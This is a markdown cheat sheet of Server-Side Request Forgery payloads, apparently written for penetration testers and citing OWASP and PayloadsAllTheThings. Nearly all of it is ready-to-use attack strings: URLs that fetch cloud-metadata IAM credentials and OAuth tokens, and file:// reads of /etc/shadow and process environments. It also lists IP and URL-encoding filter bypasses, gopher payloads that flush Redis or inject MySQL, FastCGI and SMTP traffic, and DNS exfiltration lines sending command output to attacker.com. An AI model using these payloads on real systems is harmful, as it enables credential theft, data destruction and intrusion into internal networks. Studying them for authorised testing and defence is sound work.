# SSRF Payloads

## Table of Contents
1. [Basic SSRF Payloads](#basic-ssrf-payloads)
2. [Internal Network Enumeration](#internal-network-enumeration)
3. [Cloud Metadata Exploitation](#cloud-metadata-exploitation)
4. [Protocol-Based Payloads](#protocol-based-payloads)
5. [Filter Bypass Techniques](#filter-bypass-techniques)
6. [Blind SSRF Payloads](#blind-ssrf-payloads)
7. [Advanced Exploitation](#advanced-exploitation)

---

## 1. Basic SSRF Payloads

### Direct Internal IP Access
```
http://localhost
http://127.0.0.1
http://0.0.0.0
http://[::1]
http://[0:0:0:0:0:0:0:1]
http://[::]
```

### Local Network Scanning
```
http://192.168.0.1
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1
http://169.254.169.254
```

### Port Scanning
```
http://localhost:22
http://localhost:80
http://localhost:443
http://localhost:3306
http://localhost:5432
http://localhost:6379
http://localhost:8080
http://localhost:9200
```

---

## 2. Internal Network Enumeration

### Private IP Ranges (RFC 1918)
```
http://10.0.0.0/8
http://172.16.0.0/12
http://192.168.0.0/16
```

### CIDR Notation for Scanning
```
http://10.0.0.1
http://10.0.0.2
http://10.0.0.3
...
http://10.0.0.254
```

### Common Internal Services
```
http://localhost:8080/admin
http://localhost:9090/metrics
http://localhost:5984/_utils
http://localhost:8500/ui
http://localhost:9000/minio
```

---

## 3. Cloud Metadata Exploitation

### AWS Metadata Service
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/
http://169.254.169.254/latest/meta-data/public-ipv4
http://169.254.169.254/latest/meta-data/hostname
```

### AWS IMDSv2 (Token Required)
```bash
# First request (would need to be done via SSRF chain)
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Then use token
GET http://169.254.169.254/latest/meta-data/
X-aws-ec2-metadata-token: <token>
```

### Google Cloud Platform Metadata
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/
```

With required header:
```
Metadata-Flavor: Google
```

### Azure Instance Metadata Service
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/
```

With required header:
```
Metadata: true
```

### DigitalOcean Metadata
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/user-data
```

### Alibaba Cloud Metadata
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

---

## 4. Protocol-Based Payloads

### File Protocol
```
file:///etc/passwd
file:///etc/hosts
file:///etc/shadow
file:///proc/self/environ
file:///var/log/apache2/access.log
file://C:/Windows/System32/drivers/etc/hosts
file://C:/Windows/win.ini
```

### Dict Protocol
```
dict://localhost:6379/INFO
dict://localhost:11211/stats
dict://localhost:9200/_cluster/health
```

### Gopher Protocol
```
gopher://localhost:6379/_INFO
gopher://localhost:6379/_SET%20key%20value
gopher://localhost:3306/_root%00root
gopher://localhost:11211/_stats
```

### SFTP/FTP Protocol
```
ftp://internal-server.local/
sftp://internal-server.local/
```

### LDAP Protocol
```
ldap://localhost:389/dc=example,dc=com
ldaps://localhost:636/dc=example,dc=com
```

---

## 5. Filter Bypass Techniques

### IP Address Encoding

#### Decimal Format
```
http://2130706433 (127.0.0.1)
http://3232235521 (192.168.0.1)
http://167772161 (10.0.0.1)
```

#### Octal Format
```
http://0177.0000.0000.0001 (127.0.0.1)
http://0300.0250.0000.0001 (192.168.0.1)
```

#### Hexadecimal Format
```
http://0x7f.0x00.0x00.0x01 (127.0.0.1)
http://0x7f000001 (127.0.0.1)
http://0xc0a80001 (192.168.0.1)
```

#### Mixed Encoding
```
http://127.1 (127.0.0.1)
http://127.0.1 (127.0.0.1)
http://0x7f.1 (127.0.0.1)
http://0x7f.0.0.1
```

### Domain-Based Bypasses

#### DNS Rebinding
```
http://169.254.169.254.nip.io
http://127.0.0.1.nip.io
http://spoofed.burpcollaborator.net
http://rebind.network/
```

#### Subdomain Tricks
```
http://evil.com@127.0.0.1
http://127.0.0.1.evil.com
http://127.0.0.1#evil.com
http://evil.com#@127.0.0.1
```

#### URL Parser Confusion
```
http://localhost%00.evil.com
http://evil.com#@127.0.0.1
http://evil.com%2f@127.0.0.1
http://evil.com\@127.0.0.1
```

### Character Encoding Bypasses

#### URL Encoding
```
http://%31%32%37%2e%30%2e%30%2e%31 (127.0.0.1)
http://127.0.0.1/%2e%2e/%2e%2e/etc/passwd
```

#### Double URL Encoding
```
http://%2531%2532%2537%252e%2530%252e%2530%252e%2531
```

#### Unicode Encoding
```
http://127。0。0。1 (using fullwidth Unicode dots)
http://①②⑦.⓪.⓪.①
```

### Redirect-Based Bypasses
```
http://evil.com/redirect?url=http://169.254.169.254
http://shorturl.at/xyz123 (short URL pointing to internal IP)
```

### Case Manipulation
```
http://LocalHost
http://LOCALHOST
http://LoCaLhOsT
```

### Trailing Dot Bypass
```
http://127.0.0.1.
http://localhost.
```

---

## 6. Blind SSRF Payloads

### Out-of-Band Detection
```
http://burpcollaborator.net
http://attacker.com/ssrf-test
http://requestbin.net/r/xxxxx
http://webhook.site/unique-id
```

### DNS Exfiltration
```
http://data.attacker.com
http://$(whoami).attacker.com
http://$(hostname).attacker.com
```

### Time-Based Detection
```
http://127.0.0.1:9999 (timeout if port closed)
file:///dev/random (causes delay)
```

---

## 7. Advanced Exploitation

### Redis Exploitation via Gopher
```
gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
gopher://localhost:6379/_*3%0d%0a$3%0d%0aset%0d%0a$4%0d%0atest%0d%0a$5%0d%0avalue%0d%0a
```

### MySQL Exploitation via Gopher
```
gopher://localhost:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00
```

### FastCGI Exploitation
```
gopher://localhost:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00
```

### SMTP Exploitation
```
gopher://localhost:25/_HELO%20attacker.com%0d%0aMAIL%20FROM:attacker@evil.com%0d%0aRCPT%20TO:victim@target.com%0d%0aDATA%0d%0aSubject:%20SSRF%20Test%0d%0a%0d%0aTest%20message%0d%0a.%0d%0aQUIT
```

### Memcached Exploitation
```
gopher://localhost:11211/_set%20key%200%200%205%0d%0avalid%0d%0a
gopher://localhost:11211/_get%20key%0d%0a
```

### Elasticsearch Exploitation
```
http://localhost:9200/_search?pretty
http://localhost:9200/_cluster/health
http://localhost:9200/_nodes
```

### Docker API Exploitation
```
http://localhost:2375/containers/json
http://localhost:2375/images/json
http://localhost:2376/version
```

### Kubernetes API Exploitation
```
http://localhost:8001/api/v1/namespaces
http://localhost:8001/api/v1/pods
http://localhost:10250/pods
```

---

## Testing Checklist

- [ ] Test localhost variations (127.0.0.1, ::1, localhost, 0.0.0.0)
- [ ] Test private IP ranges (10.x, 172.16.x, 192.168.x)
- [ ] Test cloud metadata endpoints
- [ ] Test alternative protocols (file://, gopher://, dict://)
- [ ] Test IP encoding bypasses (decimal, octal, hex)
- [ ] Test DNS-based bypasses
- [ ] Test URL parser confusion
- [ ] Test character encoding bypasses
- [ ] Test redirect-based bypasses
- [ ] Test blind SSRF with out-of-band channels
- [ ] Test internal service exploitation

---

## References

- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [HackTricks SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
- [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
